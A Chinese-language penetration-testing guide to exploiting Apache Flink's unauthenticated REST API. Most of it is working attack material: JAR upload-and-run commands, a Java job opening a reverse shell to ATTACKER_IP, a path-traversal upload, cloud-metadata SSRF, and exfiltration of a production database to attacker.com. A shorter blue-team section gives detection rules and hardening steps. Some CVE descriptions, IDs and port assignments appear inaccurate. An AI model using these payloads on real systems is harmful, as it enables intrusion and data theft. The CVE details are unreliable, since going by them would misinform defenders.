---
title: "Apache Flink REST API / JobManager JAR 上传 RCE 利用技术"
date: 2026-06-21T02:00:00+08:00
draft: false
weight: 92
description: "Apache Flink 流式计算引擎渗透测试：REST API 未授权访问、JAR 上传 RCE、CVE-2020-17518 目录遍历、CVE-2020-17519 信息泄露、Savepoint 攻击链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache Flink", "JobManager", "REST API", "JAR Upload", "RCE", "CVE-2020-17518", "CVE-2020-17519", "流计算安全", "渗透测试"]
---

## 0x00 攻击面总览

Apache Flink 是分布式流式计算引擎，默认配置下 REST API 无认证，可直接上传 JAR 实现 RCE：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| JobManager REST API | 8081 | HTTP | JAR 上传、任务提交、Savepoint 管理 |
| JobManager Web UI | 8081 | HTTP | 集群管理、日志查看、TaskManager 信息 |
| TaskManager | 6122 | TCP | 数据交换、任务执行 |
| BlobServer | 6123 | TCP | JAR 存储与分发 |
| Queryable State | 6125 | TCP | 状态查询 |
| JobManager RPC | 6123 | TCP | Actor 系统通信 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache Flink 集群                            │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ JobManager   │    │ TaskManager  │    │ TaskManager  │    │
│  │ :8081 (REST) │    │ :6122        │    │ :6122        │    │
│  │ JAR 上传/RCE │    │ 任务执行      │    │ 任务执行      │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              内网 / 流计算专用网络                         │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① REST API :8081 → /jars/upload → 上传恶意 JAR          │ │
│  │  ② REST API :8081 → /jars/:jarid/run → 提交任务 → RCE    │ │
│  │  ③ CVE-2020-17518 → 目录遍历 → 任意文件覆盖               │ │
│  │  ④ CVE-2020-17519 → 信息泄露 → 环境/配置窃取              │ │
│  │  ⑤ Savepoint → 状态数据窃取                               │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • REST API 无认证（security.authentication.enabled=false）     │
│  • 监听 0.0.0.0:8081                                         │
│  • JAR 上传无文件大小/类型限制                                  │
│  • 任务以 Flink 进程权限执行                                   │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 6122,6123,6125,8081 \
  --script=http-title \
  -oN flink_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
6122/tcp open  flink       Apache Flink RPC
6123/tcp open  flink       Apache Flink BlobServer
8081/tcp open  http        Apache Flink REST API
```

### 1.2 版本指纹

```bash
# 获取 Flink 版本
curl -s "http://target:8081/v1/config" | python3 -m json.tool

# 响应示例
{
  "refreshInterval": 3000,
  "timezoneName": "UTC",
  "timezoneOffset": 0,
  "flinkVersion": "1.18.0",
  "flinkRevision": "abc123"
}

# 获取集群概览
curl -s "http://target:8081/v1/overview" | python3 -m json.tool

# 响应示例
{
  "taskmanagers": 4,
  "slots-total": 16,
  "slots-available": 8,
  "jobs-running": 2,
  "jobs-finished": 10,
  "jobs-cancelled": 0,
  "jobs-failed": 1
}
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Apache Flink"
port:8081 http.title:"Apache Flink"

# FOFA
body="Apache Flink" && port="8081"
body="flink" && body="jobmanager"
```

---

## 0x02 REST API 未授权访问 — 信息收集

### 2.1 集群信息

```bash
# 配置信息
curl -s "http://target:8081/v1/config" | python3 -m json.tool

# 集群概览
curl -s "http://target:8081/v1/overview" | python3 -m json.tool

# TaskManager 列表
curl -s "http://target:8081/v1/taskmanagers" | python3 -m json.tool

# 作业列表
curl -s "http://target:8081/v1/jobs" | python3 -m json.tool
```

### 2.2 作业详情

```bash
# 获取运行中作业详情
curl -s "http://target:8081/v1/jobs/{jobId}" | python3 -m json.tool

# 获取作业执行计划
curl -s "http://target:8081/v1/jobs/{jobId}/plan" | python3 -m json.tool

# 获取作业 Checkpoint 信息
curl -s "http://target:8081/v1/jobs/{jobId}/checkpoints" | python3 -m json.tool

# 获取作业异常信息
curl -s "http://target:8081/v1/jobs/{jobId}/exceptions" | python3 -m json.tool
```

### 2.3 日志读取

```bash
# 获取 JobManager 日志
curl -s "http://target:8081/v1/jobmanager/log"

# 获取 TaskManager 日志
curl -s "http://target:8081/v1/taskmanagers/{tmId}/log"

# 获取 JobManager 环境信息
curl -s "http://target:8081/v1/jobmanager/metrics" | python3 -m json.tool
```

---

## 0x03 JAR 上传 — RCE

### 3.1 上传恶意 JAR

Flink REST API 允许上传任意 JAR 文件并提交执行：

```bash
# 上传 JAR 文件
curl -s -X POST "http://target:8081/v1/jars/upload" \
  -H "Expect: 100-continue" \
  -F "jarfile=@/path/to/evil-job.jar"

# 响应示例
{
  "filename": "/tmp/flink-web-upload/evil-job.jar",
  "status": "success"
}
```

### 3.2 列出已上传的 JAR

```bash
curl -s "http://target:8081/v1/jars" | python3 -m json.tool

# 响应示例
{
  "files": [
    {
      "id": "abc123-def456-evil-job.jar",
      "name": "evil-job.jar",
      "uploaded": 1687234567890,
      "entry": [
        {
          "name": "com.evil.EvilJob",
          "description": null
        }
      ]
    }
  ]
}
```

### 3.3 提交恶意任务 — RCE

```bash
# 提交 JAR 作为 Flink 任务执行
curl -s -X POST "http://target:8081/v1/jars/abc123-def456-evil-job.jar/run" \
  -H "Content-Type: application/json" \
  -d '{
    "entryClass": "com.evil.EvilJob",
    "programArgs": "",
    "parallelism": 1,
    "allowNonRestoredState": true
  }'
```

### 3.4 恶意 Flink Job 示例

```java
import org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;
import org.apache.flink.streaming.api.functions.source.SourceFunction;

public class EvilJob {
    public static void main(String[] args) throws Exception {
        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();

        env.addSource(new SourceFunction<String>() {
            @Override
            public void run(SourceContext<String> ctx) throws Exception {
                Runtime.getRuntime().exec(new String[]{
                    "/bin/bash", "-c",
                    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
                });
            }

            @Override
            public void cancel() {}
        });

        env.execute("evil-job");
    }
}
```

### 3.5 通过 ProcessFunction 执行命令

```java
import org.apache.flink.streaming.api.functions.ProcessFunction;
import org.apache.flink.util.Collector;

public class EvilProcessFunction extends ProcessFunction<String, String> {
    @Override
    public void processElement(String value, Context ctx, Collector<String> out) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", "id; hostname; cat /etc/passwd");
        Process proc = pb.start();
        java.io.BufferedReader br = new java.io.BufferedReader(
            new java.io.InputStreamReader(proc.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.collect(line);
        }
    }
}
```

---

## 0x04 CVE-2020-17518 — 目录遍历

### 4.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Flink 1.5.0 - 1.11.2 |
| CVSS | 10.0（Critical） |
| 类型 | 目录遍历（通过 JAR 上传接口） |
| 攻击向量 | `POST /v1/jars/upload` |
| 认证要求 | 无 |
| 根因 | `filename` 参数未过滤路径遍历字符，允许写入任意文件 |

### 4.2 漏洞利用

```bash
# 通过路径遍历写入任意文件
# filename 参数中的 ../../ 被用于遍历目录
curl -s -X POST "http://target:8081/v1/jars/upload" \
  -H "Expect: 100-continue" \
  -F "jarfile=@/path/to/malicious.jar;filename=../../../../../../tmp/evil.jar"
```

**危害**：攻击者可以覆盖 Flink 集群中任意文件，包括：
- 覆盖 Flink 配置文件实现持久化
- 写入 SSH authorized_keys
- 覆盖 crontab 实现定时任务
- 写入 WebShell（如果 Flink 与 Web 服务同机）

---

## 0x05 CVE-2020-17519 — 信息泄露

### 5.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache Flink 1.11.0 - 1.11.2 |
| CVSS | 5.0（Medium） |
| 类型 | 信息泄露 |
| 攻击向量 | REST API 多个端点 |
| 认证要求 | 无 |
| 根因 | JobManager REST API 泄露敏感环境信息 |

### 5.2 信息泄露利用

```bash
# 获取完整环境配置
curl -s "http://target:8081/v1/config" | python3 -m json.tool

# 获取 JVM 参数（可能含密码、密钥）
curl -s "http://target:8081/v1/jobmanager/metrics" | python3 -m json.tool

# 获取作业异常信息（可能含内部路径、凭据）
curl -s "http://target:8081/v1/jobs/{jobId}/exceptions" | python3 -m json.tool

# 获取 TaskManager 环境信息
curl -s "http://target:8081/v1/taskmanagers/{tmId}/metrics" | python3 -m json.tool
```

---

## 0x06 Savepoint 攻击

### 6.1 Savepoint 触发

```bash
# 触发 Savepoint（导出作业状态）
curl -s -X POST "http://target:8081/v1/jobs/{jobId}/savepoints" \
  -H "Content-Type: application/json" \
  -d '{
    "target-directory": "file:///tmp/savepoints",
    "cancel-job": false
  }'
```

### 6.2 Savepoint 数据窃取

Savepoint 包含作业运行时的完整状态数据，可能含：
- 用户会话信息
- 缓存的凭据
- 业务中间状态数据
- 加密密钥

```bash
# 列出 Savepoint
curl -s "http://target:8081/v1/jobs/{jobId}/savepoints" | python3 -m json.tool

# Savepoint 存储在 HDFS/S3 等外部存储时
# 攻击者可以通过获取 Savepoint 路径直接访问
```

---

## 0x07 作业管理操作

### 7.1 取消作业

```bash
# 取消运行中的作业
curl -s -X PATCH "http://target:8081/v1/jobs/{jobId}?mode=cancel"
```

### 7.2 删除 JAR

```bash
# 删除已上传的 JAR
curl -s -X DELETE "http://target:8081/v1/jars/{jarId}"
```

### 7.3 触发 Checkpoint

```bash
# 触发 Checkpoint
curl -s -X POST "http://target:8081/v1/jobs/{jobId}/checkpoints"
```

---

## 0x08 高级利用技术

### 8.1 通过 REST API 实现 SSRF

```bash
# 提交一个从外部 URL 读取数据的 Flink 任务
# 恶意 JAR 中配置从内网地址读取数据
curl -s -X POST "http://target:8081/v1/jars/{jarId}/run" \
  -H "Content-Type: application/json" \
  -d '{
    "entryClass": "com.evil.SSRFJob",
    "programArgs": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "parallelism": 1
  }'
```

### 8.2 通过 Flink SQL 连接器窃取数据

```bash
# 如果集群支持 Flink SQL，可以通过 SQL Client 提交
# 恶意 JAR 中实现 JDBC/Kafka/S3 连接器窃取数据

# 通过 REST API 提交 SQL 任务
curl -s -X POST "http://target:8081/v1/jars/{jarId}/run" \
  -H "Content-Type: application/json" \
  -d '{
    "entryClass": "com.evil.DataExfilJob",
    "programArgs": "--source jdbc:mysql://internal-db:3306/production --sink http://attacker.com/collect",
    "parallelism": 1
  }'
```

### 8.3 持久化 — 配置覆盖

```bash
# 通过 CVE-2020-17518 覆盖 Flink 配置
# 在 flink-conf.yaml 中添加恶意配置
# 例如：添加自定义 UDF 或修改 classpath
```

---

## 0x09 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2020-17518 | 目录遍历 | 10.0 | JAR 上传路径遍历，任意文件写入 |
| CVE-2020-17519 | 信息泄露 | 5.0 | REST API 泄露环境配置信息 |
| CVE-2021-27863 | 目录遍历 | 10.0 | web 端 JAR 上传路径遍历（变体） |
| CVE-2022-27849 | 信息泄露 | 5.0 | JobManager 日志信息泄露 |

**CVE-2020-17518 / CVE-2021-27863 影响范围**：

Apache Flink 1.5.0 - 1.11.2。CVSS 10.0，无需认证。攻击者通过 JAR 上传接口的路径遍历漏洞，可以覆盖服务器上的任意文件。

---

## 0x10 蓝队检测方案

### 10.1 网络层检测

```yaml
title: Apache Flink REST API 外部访问检测
id: flink-rest-external-access
status: experimental
description: 检测来自非内网段的 Flink REST API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8081
      - 6122
      - 6123
      - 6125
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 10.2 JAR 上传检测

```yaml
title: Flink JAR 上传检测
id: flink-jar-upload
status: experimental
description: 检测 Flink REST API 的 JAR 上传行为
logsource:
  product: apache_flink
  service: jobmanager
detection:
  selection_upload:
    uri|contains: "/v1/jars/upload"
    method: "POST"
  selection_traversal:
    body|contains:
      - "../"
      - "..\\"
      - "/etc/"
      - "/root/"
  condition: selection_upload or selection_traversal
level: critical
```

### 10.3 审计日志分析

```bash
# 监控 JAR 上传
grep "/v1/jars/upload" /var/log/flink/flink-*-standalone-*.log

# 监控任务提交
grep "/v1/jars/.*/run" /var/log/flink/flink-*-standalone-*.log

# 监控目录遍历尝试
grep -E "\.\./" /var/log/flink/flink-*-standalone-*.log

# 监控异常作业取消
grep "mode=cancel" /var/log/flink/flink-*-standalone-*.log

# 监控 Savepoint 触发
grep "/v1/jobs/.*/savepoints" /var/log/flink/flink-*-standalone-*.log
```

### 10.4 加固清单

```
[ ] 升级至 Apache Flink >= 1.12.0（修复 CVE-2020-17518/17519）
[ ] REST API (8081) 仅允许内网访问
[ ] 启用 Flink 认证：security.authentication.enabled=true
[ ] 配置 security.authentication.factory 使用 Kerberos/其他认证器
[ ] 启用 HTTPS：security.ssl.rest.enabled=true
[ ] 限制 JAR 上传大小：rest.upload.max-size
[ ] 配置 REST API 访问控制列表
[ ] 在前面放置反向代理（Nginx/HAProxy）并启用认证
[ ] 启用审计日志并接入 SIEM
[ ] 监控 /v1/jars/upload 请求中的路径遍历字符
[ ] 监控 /v1/jars/*/run 请求中的异常 entryClass
[ ] 定期审查已上传的 JAR 列表
[ ] 限制 TaskManager 网络访问
[ ] 配置 ZooKeeper 认证（如使用 HA 模式）
[ ] 使用 Flink 的细粒度资源管理限制任务权限
```

---

## 0x11 渗透测试检查清单

```
[ ] 端口扫描：8081, 6122, 6123, 6125
[ ] REST API (8081) 未授权访问测试（/v1/config）
[ ] 集群信息收集（/v1/overview, /v1/taskmanagers）
[ ] 作业列表与详情枚举（/v1/jobs）
[ ] 日志读取测试（/v1/jobmanager/log）
[ ] JAR 上传测试（/v1/jars/upload）
[ ] 恶意 JAR 提交 RCE 测试（/v1/jars/{jarId}/run）
[ ] CVE-2020-17518 目录遍历测试（filename 参数）
[ ] CVE-2020-17519 信息泄露测试
[ ] Savepoint 触发与数据窃取测试
[ ] 作业取消操作测试
[ ] 版本信息收集与 CVE 匹配
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] SSRF 链测试（通过恶意 JAR 访问内网/云元数据）
```

---

## 0x12 小结

Apache Flink 的攻击面以 **REST API（端口 8081）** 为核心。默认配置下 REST API 无认证，攻击者可以直接上传恶意 JAR 文件并提交执行，实现远程代码执行。**CVE-2020-17518**（CVSS 10.0）通过 JAR 上传接口的路径遍历漏洞允许覆盖任意文件，影响极为严重。与 Hadoop/Spark 生态类似，Flink 任务以进程权限执行，一旦获得 JAR 提交权限就等于获得了服务器 Shell。蓝队应重点关注：升级至 1.12.0+、限制 REST API 网络访问、启用认证和 HTTPS、监控 JAR 上传行为、将审计日志接入 SIEM。
